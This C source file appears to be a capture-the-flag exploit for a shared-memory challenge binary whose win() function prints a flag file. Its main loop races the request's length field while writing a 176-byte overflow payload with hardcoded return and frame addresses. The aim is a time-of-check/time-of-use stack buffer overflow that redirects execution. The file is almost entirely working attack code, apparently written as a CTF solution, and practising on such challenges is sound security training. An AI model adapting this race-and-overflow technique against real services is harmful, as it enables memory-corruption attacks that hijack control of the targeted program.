#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define MAX_STR_LEN 256

typedef struct req {
    unsigned char len;
    char shift;
    char buf[MAX_STR_LEN];
} shm_req_t;

void shift_str(char* str, int len, char shift, char out[MAX_STR_LEN]) {
    for(int i = 0; i < len; i++) {
        out[i] = str[i] + shift;
    }
    out[len] = '\0';
}

void win() {
    char flag[0x100];
    int fd = open("/home/ctf/chal/flag.txt", O_RDONLY);
    read(fd, flag, 0x100);
    printf("%s\n", flag);
}

int main(int argc, char** argv) {
    char out[MAX_STR_LEN];

    if(argc != 2) {
        fprintf(stderr, "Usage: %s <name>\n", argv[0]);
        exit(1);
    }

    char* name = argv[1];
    //usleep(100);
    //mode_t old_umask = umask(0);
    int fd = shm_open(name, O_RDWR,0);
    //umask(old_umask);
    if(fd == -1) {
        fprintf(stderr, "shm_open error");
        exit(1);
    }

    if(ftruncate(fd, 0x1000) == -1) {
        fprintf(stderr, "ftruncate error");
        exit(1);
    }

    shm_req_t* shm_req = mmap(NULL, sizeof(shm_req_t), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if(shm_req == MAP_FAILED) {
        fprintf(stderr, "mmap error");
        exit(1);
    }


    char c[256] = {};
    for(int i = 0 ; i < 136 ;++i) {
      c[i] = 'a';
    }
    *(long*)((char*)c+136) = 0x404068;
    *(long*)((char*)c+168) = 0x40124c;

    while(1) {
      shm_req->len = 128;
      usleep(1);
      shm_req->shift = 0;
      shm_req->len = 200;
      memcpy(shm_req->buf,c,168+8);
      usleep(1);
      shm_req->len = 0;
    }
    return 0;
}
